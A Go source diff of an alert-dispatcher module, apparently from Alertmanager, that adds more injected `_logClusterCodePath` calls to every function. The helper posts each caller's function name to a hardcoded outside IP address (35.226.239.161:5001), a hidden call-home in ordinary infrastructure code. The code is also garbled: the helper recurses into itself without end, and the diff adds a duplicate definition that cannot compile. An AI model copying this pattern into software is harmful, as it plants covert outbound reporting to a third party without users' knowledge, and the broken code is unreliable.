@@ -35,10 +35,14 @@ type Dispatcher struct {
 func NewDispatcher(ap provider.Alerts, r *Route, s notify.Stage, mk types.Marker, to func(time.Duration) time.Duration, l log.Logger) *Dispatcher {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	disp := &Dispatcher{alerts: ap, stage: s, route: r, marker: mk, timeout: to, logger: log.With(l, "component", "dispatcher")}
 	return disp
 }
 func (d *Dispatcher) Run() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	d.done = make(chan struct{})
@@ -50,6 +54,8 @@ func (d *Dispatcher) Run() {
 	close(d.done)
 }
 func (d *Dispatcher) run(it provider.AlertIterator) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	cleanup := time.NewTicker(30 * time.Second)
@@ -91,6 +97,8 @@ func (d *Dispatcher) run(it provider.AlertIterator) {
 func (d *Dispatcher) Stop() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if d == nil || d.cancel == nil {
 		return
 	}
@@ -102,6 +110,8 @@ func (d *Dispatcher) Stop() {
 type notifyFunc func(context.Context, ...*types.Alert) bool
 
 func (d *Dispatcher) processAlert(alert *types.Alert, route *Route) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	groupLabels := getGroupLabels(alert, route)
@@ -128,6 +138,8 @@ func (d *Dispatcher) processAlert(alert *types.Alert, route *Route) {
 	ag.insert(alert)
 }
 func getGroupLabels(alert *types.Alert, route *Route) model.LabelSet {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	groupLabels := model.LabelSet{}
@@ -157,6 +169,8 @@ type aggrGroup struct {
 func newAggrGroup(ctx context.Context, labels model.LabelSet, r *Route, to func(time.Duration) time.Duration, logger log.Logger) *aggrGroup {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if to == nil {
 		to = func(d time.Duration) time.Duration {
 			return d
@@ -172,9 +186,13 @@ func newAggrGroup(ctx context.Context, labels model.LabelSet, r *Route, to func(
 func (ag *aggrGroup) fingerprint() model.Fingerprint {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return ag.labels.Fingerprint()
 }
 func (ag *aggrGroup) GroupKey() string {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	return fmt.Sprintf("%s:%s", ag.routeKey, ag.labels)
@@ -182,9 +200,13 @@ func (ag *aggrGroup) GroupKey() string {
 func (ag *aggrGroup) String() string {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return ag.GroupKey()
 }
 func (ag *aggrGroup) run(nf notifyFunc) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	ag.done = make(chan struct{})
@@ -215,10 +237,14 @@ func (ag *aggrGroup) run(nf notifyFunc) {
 func (ag *aggrGroup) stop() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	ag.cancel()
 	<-ag.done
 }
 func (ag *aggrGroup) insert(alert *types.Alert) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if err := ag.alerts.Set(alert); err != nil {
@@ -233,9 +259,13 @@ func (ag *aggrGroup) insert(alert *types.Alert) {
 func (ag *aggrGroup) empty() bool {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return ag.alerts.Count() == 0
 }
 func (ag *aggrGroup) flush(notify func(...*types.Alert) bool) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	if ag.empty() {
@@ -274,7 +304,16 @@ func (ag *aggrGroup) flush(notify func(...*types.Alert) bool) {
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
